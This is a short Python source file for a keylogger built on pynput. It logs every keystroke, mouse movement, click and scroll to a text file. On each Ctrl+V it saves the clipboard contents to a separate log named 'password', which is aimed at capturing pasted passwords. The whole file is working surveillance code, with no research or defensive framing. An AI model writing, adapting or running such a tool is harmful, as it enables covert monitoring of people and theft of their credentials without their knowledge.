import pynput.keyboard
from pynput import keyboard
from pynput import  mouse
import logging
import clipboard

import pyperclip
output_= ""
def pass_or_keymouse(name, log_file, level=logging.INFO):

    if name == "password":
        formatter = logging.Formatter("%(message)s".format(end=''))
    else:
        formatter = logging.Formatter("%(message)s")
    handler = logging.FileHandler(log_file)
    handler.setFormatter(formatter)
    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)
    return logger

log_key_mouse=pass_or_keymouse('key_mouse',"logger.txt")
log_password=pass_or_keymouse('password','part2.txt')

def on_press(key):

   ctrlC = pynput.keyboard.KeyCode.from_char('\x03')  # ctrl+c
   ctrlV = pynput.keyboard.KeyCode.from_char('\x16')  # ctrl+v
   if key == ctrlC:
      log_key_mouse.info('copied!!')
   elif key == ctrlV:
       log_password.info(clipboard.paste())
   else:
       log_key_mouse.info(str(key))


    #if key == key.esc:
        #return False

 #mouse movemnt and clicks
def on_move(x,y):
    log_key_mouse.info('mouse moved to ({0},{1})'.format(x,y))

def on_click(x,y,boutton,pressed):
    log_key_mouse.info('{0} at {1}'.format('pressed' if pressed else 'Released',(x,y)))
    if not pressed:
        return False

def on_scroll(x,y,dx,dy):
    log_key_mouse.info('Scrolled {0} at {1})'.format('down' if dy<0 else 'up',(x,y)))


with mouse.Listener(on_move=on_move,on_click=on_click,on_scroll=on_scroll) as listenr:
    listenr.join()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


